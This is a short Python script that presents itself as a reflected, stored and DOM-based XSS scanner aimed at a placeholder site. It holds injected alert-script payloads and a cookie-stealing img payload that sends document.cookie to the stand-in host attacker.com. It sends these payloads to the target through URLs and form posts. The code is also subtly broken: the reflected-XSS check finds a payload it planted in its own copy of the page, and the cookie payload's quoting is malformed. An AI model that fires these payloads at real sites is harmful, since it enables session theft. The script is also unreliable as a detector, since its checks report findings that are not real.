import requests
from bs4 import BeautifulSoup
import re


# Function to detect and print reflected XSS payloads
def detect_reflected_xss(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    for form in forms:
        inputs = form.find_all('input')
        for input_tag in inputs:
            if input_tag.get('type') != 'hidden':
                payload = '<script>alert("Reflected XSS");</script>'
                input_tag['value'] = payload
    modified_html = str(soup)
    if '<script>alert("Reflected XSS");</script>' in modified_html:
        print("Reflected XSS payload: ", payload)


# Function to detect and print stolen cookie payloads with reflected XSS
def detect_stolen_cookie_payload(url):
    response = requests.get(url)
    cookie_payload = '<img src="http://attacker.com/steal?cookie="+document.cookie+"/>'
    modified_url = url + cookie_payload
    response = requests.get(modified_url)
    if 'attacker.com' in response.text:
        print("Stolen Cookie payload: ", cookie_payload)


# Function to detect and print stored XSS payloads
def detect_stored_xss(url):
    payload = '<script>alert("Stored XSS");</script>'
    response = requests.post(url, data={'comment': payload})
    if payload in response.text:
        print("Stored XSS payload: ", payload)


# Function to detect and print DOM-based XSS payloads
def detect_dom_based_xss(url):
    response = requests.get(url)
    script_tags = re.findall(r'<script.*?>.*?</script>', response.text, re.IGNORECASE)
    for script in script_tags:
        if 'document.location' in script:
            print("DOM-based XSS payload: ", script)


# Specify the target URL
target_url = 'https://example.com/'

# Call the respective functions to detect and print payloads
detect_reflected_xss(target_url)
detect_stolen_cookie_payload(target_url)
detect_stored_xss(target_url)
detect_dom_based_xss(target_url)
